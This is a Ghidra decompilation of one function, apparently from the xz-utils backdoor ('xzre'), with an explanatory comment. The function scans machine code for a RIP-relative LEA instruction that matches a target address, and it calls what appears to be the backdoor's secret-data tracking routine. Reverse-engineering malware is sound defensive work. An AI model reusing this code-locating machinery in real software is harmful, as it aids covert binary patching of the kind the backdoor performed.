// /home/kali/xzre-ghidra/xzregh/100F60_find_lea_instruction_with_mem_operand.c
// Function: find_lea_instruction_with_mem_operand @ 0x100F60
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_lea_instruction_with_mem_operand(u8 * code_start, u8 * code_end, dasm_ctx_t * dctx, void * mem_address)


/*
 * AutoDoc: LEA finder that insists the instruction truly references memory: waits for opcode `0x10d` with REX.W set and a memory ModRM form, using a scratch decoder when the caller passes NULL.
 * If `mem_address` is supplied it replays the RIP-relative calculation (`instruction + instruction_size + mem_disp`) and only succeeds on an exact match, returning with `dctx` still on the LEA.
 */

#include "xzre_types.h"

BOOL find_lea_instruction_with_mem_operand
               (u8 *code_start,u8 *code_end,dasm_ctx_t *dctx,void *mem_address)

{
  BOOL decode_ok;
  long clear_idx;
  dasm_ctx_t *zero_ctx;
  byte clear_stride_marker;
  dasm_ctx_t scratch_ctx;
  
  clear_stride_marker = 0;
  decode_ok = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x1c8,0,0x1e,FALSE);
  if (decode_ok != FALSE) {
    zero_ctx = &scratch_ctx;
    for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
      *(undefined4 *)&zero_ctx->instruction = 0;
      zero_ctx = (dasm_ctx_t *)((long)zero_ctx + ((ulong)clear_stride_marker * -2 + 1) * 4);
    }
    if (dctx == (dasm_ctx_t *)0x0) {
      dctx = &scratch_ctx;
    }
    for (; code_start < code_end; code_start = code_start + 1) {
      decode_ok = x86_dasm(dctx,code_start,code_end);
      if ((((decode_ok != FALSE) && (*(int *)(dctx->opcode_window + 3) == 0x10d)) &&
          (((dctx->prefix).decoded.rex.rex_byte & 0x48) == 0x48)) &&
         ((((dctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000 &&
          ((mem_address == (void *)0x0 ||
           (dctx->instruction + dctx->mem_disp + dctx->instruction_size == (u8 *)mem_address)))))) {
        return TRUE;
      }
    }
  }
  return FALSE;
}

